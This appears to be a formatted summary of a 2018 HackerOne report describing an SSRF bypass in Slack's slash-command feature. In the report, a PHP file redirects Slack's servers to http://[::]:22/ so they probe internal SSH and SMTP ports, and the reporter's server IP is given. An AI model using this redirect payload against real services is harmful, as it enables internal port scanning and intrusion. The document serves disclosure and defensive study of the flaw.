# SSRF in api.slack.com, using slash commands and bypassing the protections.

## Metadata
- **Source:** HackerOne
- **Report:** 381129 | https://hackerone.com/reports/381129
- **Submitted:** 2018-07-13
- **Reporter:** elber
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** medium
- **Vuln:** Server-Side Request Forgery (SSRF)
- **CVEs:** None
- **Category:** web-api

## Summary
Bypassing the reports #61312 and #356765

**Tutorial:**


**Go to api.slack.com and create an application with your own slash command.**
{F320014}

**Enter your own domain:**
*in your own domain: index.php*

`<?php
header("location: http://[::]:22/");
?> `

location: http://[::]:22/

{F320019}

And save.

Go to your Slack and type /youslash


Try with my server http://206.189.204.187/


Results:



## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Bypassing the reports #61312 and #356765

**Tutorial:**


**Go to api.slack.com and create an application with your own slash command.**
{F320014}

**Enter your own domain:**
*in your own domain: index.php*

`<?php
header("location: http://[::]:22/");
?> `

location: http://[::]:22/

{F320019}

And save.

Go to your Slack and type /youslash


Try with my server http://206.189.204.187/


Results:

SSH
{F320015}

SMNTP
{F320016}

## Impact

In a Server-Side Request Forgery (SSRF) attack, the attacker can abuse functionality on the server to read or update internal resources, and scan for internal ports and get the versions of the services running on the server.
 
Referer: https://www.owasp.org/index.php/Server_Side_Request_Forgery
https://hackerone.com/reports/61312

</details>

---
*Analysed by Claude on 2026-05-24*
